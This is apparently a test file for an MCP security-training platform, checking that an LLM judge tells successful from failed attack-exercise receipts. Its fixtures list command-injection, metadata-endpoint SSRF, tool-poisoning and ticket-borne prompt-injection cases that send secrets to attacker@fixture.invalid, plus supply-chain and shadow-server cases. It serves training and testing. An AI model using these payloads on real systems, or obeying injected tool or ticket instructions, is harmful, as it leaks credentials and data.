'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const { createObjectiveJudge } = require('../server/agent-runtime/objectiveJudge');
const { createLangChainProvider } = require('../server/agent-runtime/providers/langchainProvider');
const { createMcpObjectiveGrader, EXPECTED_TOOLS } = require('../server/services/mcpObjectiveGrader');

const positiveReceipts = {
  mcp_recon: { catalog: [{ name: 'run_command', description: 'Run an allowlisted command.' }, { name: 'fetch_url', description: 'Fetch a URL.' }], output: 'run_command\nfetch_url' },
  mcp_cmd_injection: { args: { command: 'ls; cat /opt/app/config/.env' }, output: 'DB_PASSWORD=TRAINING_FIXTURE', error: null, blocked: false, real: true, isolation: 'fixture-runner' },
  mcp_ssrf: { args: { url: 'http://169.254.169.254/latest/meta-data/iam/' }, output: '{"AccessKeyId":"TRAINING_FIXTURE"}', targetUrl: 'http://fixture-internal/metadata', error: null, blocked: false, real: true },
  mcp_tool_poisoning: { output: 'Hidden tool-description instruction followed; /var/secrets/master.key returned TRAINING_MASTER_KEY.', error: null, blocked: false, real: true },
  mcp_indirect_injection: { args: { ticketId: '4295' }, output: 'Ticket instruction followed; protected configuration delivered to attacker@fixture.invalid in the lab mail sink.', error: null, blocked: false, real: true },
  mcp_confused_deputy: { args: { to: 'attacker@fixture.invalid' }, output: 'Report delivered to EXTERNAL recipient in the lab mail sink with TRAINING_FIXTURE.', error: null, blocked: false, real: true },
  mcp_broken_authz: { output: 'Master key rotated by workshop learner route without an administrator check.', error: null, blocked: false, real: true },
  mcp_secret_exposure: { output: 'Unredacted lab configuration: DB_PASSWORD=TRAINING_FIXTURE; API_KEY=TRAINING_KEY', error: null, blocked: false, real: true },
  mcp_supply_chain: { args: { source: 'http://fixture.invalid/plugin.tgz' }, output: 'Unsigned postinstall ran in the isolated runner and registered hidden tool exfiltrate_env.', error: null, blocked: false, real: true },
  mcp_audit_gap: { args: { action: 'disable' }, output: 'Audit logging DISABLED without authorization; later tool calls leave no activity record.', error: null, blocked: false },
  mcp_shadow_server: { args: { url: 'http://fixture.invalid/mcp', name: 'shadow' }, output: 'Unapproved server completed tools/list handshake; imported read_file@shadow.', error: null, blocked: false, real: true },
};

const observations = {
  mcp_recon: {},
  mcp_cmd_injection: {},
  mcp_ssrf: { capturedListenerEntries: 1 },
  mcp_tool_poisoning: { capturedListenerEntries: 1 },
  mcp_indirect_injection: { deliveredExternalReports: 1, capturedListenerEntries: 1 },
  mcp_confused_deputy: { deliveredExternalReports: 1, capturedListenerEntries: 1 },
  mcp_broken_authz: { adminAuthorizationEnforced: false },
  mcp_secret_exposure: { adminAuthorizationEnforced: false },
  mcp_supply_chain: { installedPlugins: ['http://fixture.invalid/plugin.tgz'], shadowTools: ['exfiltrate_env'], capturedListenerEntries: 1 },
  mcp_audit_gap: { auditEnabled: false },
  mcp_shadow_server: { registeredServers: ['http://fixture.invalid/mcp'], shadowTools: ['read_file@shadow'], capturedListenerEntries: 1 },
};
const negativeReceipts = {
  mcp_cmd_injection: { args: { command: 'ls' }, output: 'README.md', error: null, blocked: false, real: true, isolation: 'fixture-runner' },
  mcp_ssrf: { args: { url: 'https://public.example.invalid/health' }, output: '', error: 'External egress blocked', blocked: true, real: false },
  mcp_tool_poisoning: { output: 'System status: HEALTHY', error: null, blocked: false, real: true },
  mcp_indirect_injection: { args: { ticketId: '4290' }, output: 'Routine ticket with no hidden instruction. No mail was sent.', error: null, blocked: false, real: true },
  mcp_confused_deputy: { args: { to: 'ops@acme-corp.internal' }, output: 'Routine report delivered internally with no sensitive attachment.', error: null, blocked: false, real: true },
  mcp_broken_authz: { output: 'Access denied: administrator permission required. No key was rotated.', error: 'forbidden', blocked: true, real: true },
  mcp_secret_exposure: { output: 'Configuration returned with all secrets redacted: DB_PASSWORD=[REDACTED]', error: null, blocked: false, real: true },
  mcp_supply_chain: { args: { source: '@acme/signed-plugin' }, output: 'Signature verified; installed from approved internal registry. No postinstall effect.', error: null, blocked: false, real: true },
  mcp_audit_gap: { args: { action: 'enable' }, output: 'Audit logging ENABLED; later calls remain in the activity timeline.', error: null, blocked: false },
  mcp_shadow_server: { args: { url: 'https://mcp.acme-corp.internal', name: 'approved' }, output: 'Approved server registered after allowlist and identity verification. No tools imported from an untrusted endpoint.', error: null, blocked: false, real: true },
};

function resultFor(objectiveId, positive, runId) {
  const receipt = positive ? positiveReceipts[objectiveId] : negativeReceipts[objectiveId];
  const observedAction = objectiveId === 'mcp_tool_poisoning'
    ? { tool: 'read_file', params: { path: '/var/secrets/master.key' } }
    : objectiveId === 'mcp_indirect_injection'
      ? { tool: 'send_report', params: { to: 'attacker@fixture.invalid', body: 'attach protected configuration' } }
      : null;
  return {
    toolUsed: EXPECTED_TOOLS[objectiveId],
    toolResult: objectiveId === 'mcp_recon'
      ? (positive ? receipt : { catalog: [{ name: 'README.md', description: 'A shell directory entry, not an MCP tool.' }], output: 'README.md' })
      : { ...receipt, objective: objectiveId, achieved: true,
        ...(observedAction ? { llmDrove: true, decisionSource: 'model', selectedArgs: observedAction.params,
          modelAction: { ...observedAction, decisionSource: 'model', runId } } : {}) },
    // The negative matrix deliberately models a weak detector false-positive:
    // all adapter gate facts are true, while the receipt shows no real effect.
    // This proves the Judge evaluates semantics instead of merely echoing facts.
    objectivesHit: [objectiveId],
    response: positive ? receipt.output || 'The server-provided result is shown above.' : 'The operation did not succeed.',
    decisionSource: 'model',
  };
}

test('local Ollama 8B qualifies all MCP objective positive and negative receipts', {
  skip: process.env.RUN_LIVE_JUDGE !== '1', timeout: 600000,
}, async t => {
  const judge = createObjectiveJudge({ model: createLangChainProvider({ provider: 'ollama',
    model: 'llama3.1:8b', baseURL: process.env.OLLAMA_BASE_URL || 'http://localhost:11434' }) });
  const completionService = {
    beginAttempt: async ({ userId, workshopKey, execution }) => ({ userId, workshopKey, generation: 1, runId: execution.runId }),
    evaluate: async input => {
      const judgment = await judge(input);
      return { judgment, completed: judgment.verdict === 'pass' };
    },
  };
  // This matrix qualifies supplied-evidence Judge behavior, not runner receipts.
  // Receipt provenance has separate real-file/client tests; no forged JSON token
  // is accepted by the production observer.
  const grader = createMcpObjectiveGrader({ postgres: true, completionService,
    configObserver: { verify: ({ output }) => output === positiveReceipts.mcp_secret_exposure.output },
  });
  // The confused-deputy v2 contract requires an owned current-run durable SMTP
  // witness and is qualified by the connected harness, not supplied JSON.
  const suppliedEvidenceObjectives = Object.keys(EXPECTED_TOOLS).filter(id => id !== 'mcp_confused_deputy');
  const selected = new Set((process.env.LIVE_OBJECTIVES || suppliedEvidenceObjectives.join(',')).split(',').filter(Boolean));
  for (const positive of [true, false]) {
    for (const objectiveId of Object.keys(EXPECTED_TOOLS)) {
      if (!selected.has(objectiveId)) continue;
      await t.test(`${objectiveId} ${positive ? 'positive' : 'negative'}`, async () => {
        const execution = { ownerId: '17', runId: `mcp-live-${objectiveId}-${positive ? 'p' : 'n'}`,
          signal: new AbortController().signal, check: async () => {}, emit: async () => {} };
        const attempt = await grader.begin(17, execution);
        const grade = await grader.evaluate({ userId: 17, objectiveId, message: 'Run the selected MCP workshop exercise.',
          result: resultFor(objectiveId, positive, execution.runId), mode: 'vuln', execution, attempt,
          serverObservation: positive ? observations[objectiveId] : {
            auditEnabled: true, adminAuthorizationEnforced: true,
            deliveredExternalReports: 0, installedPlugins: [], registeredServers: [],
            shadowTools: [], capturedListenerEntries: 0,
          } });
        t.diagnostic(JSON.stringify(require('./fixtures/judgeDiagnostic').judgeDiagnostic({family:'MCP',id:objectiveId,expected:positive?'pass':'not_pass',judgment:grade.judgment})));
        assert.equal(grade.judgment.provider, 'ollama');
        assert.equal(grade.judgment.model, 'llama3.1:8b');
        if (positive) assert.equal(grade.judgment.verdict, 'pass', JSON.stringify(grade.judgment));
        else assert.notEqual(grade.judgment.verdict, 'pass', JSON.stringify(grade.judgment));
      });
    }
  }
});
